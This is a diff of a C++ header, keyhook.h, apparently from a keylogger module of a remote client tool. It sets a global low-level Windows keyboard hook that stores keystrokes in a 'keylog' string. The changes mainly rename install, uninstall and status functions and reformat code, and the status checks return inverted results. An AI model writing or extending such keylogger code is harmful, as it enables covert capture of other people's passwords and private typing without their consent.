@@ -2,13 +2,14 @@
 #ifndef KEYHOOK_H
 #define KEYHOOK_H
 
-#include <Windows.h>
+#include <iostream>
+#include "Windows.h"
 #include <task\client_tasks\keylogger\key_constrants.h>
 
 namespace keyhook {
+	std::string keylog{};
 
 	HHOOK eHook = nullptr;
-	std::string keylog = {};
 
 	LRESULT keyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	{
@@ -46,28 +47,23 @@ namespace keyhook {
 		return CallNextHookEx(eHook, nCode, wparam, lparam);
 	}
 
-	bool install_hook()
+	bool InstallHook()
 	{
-		eHook = SetWindowsHookEx(
-			WH_KEYBOARD_LL, 
-			(HOOKPROC)keyboardProc, 
-			GetModuleHandle(NULL),
-			0
-		);
+		eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboardProc, GetModuleHandle(NULL), 0);
 		return eHook == NULL;
 	}
 
-	bool uninstall_hook()
+	bool UninstallHook()
 	{
 		BOOL b = UnhookWindowsHookEx(eHook);
 		eHook = NULL;
 		return (bool)b;
 	}
 
-	bool is_hooked()
+	bool isHooked()
 	{
 		return (bool)(eHook == NULL);
 	}
 
 }
-#endif
+#endif // KEYHOOK_H
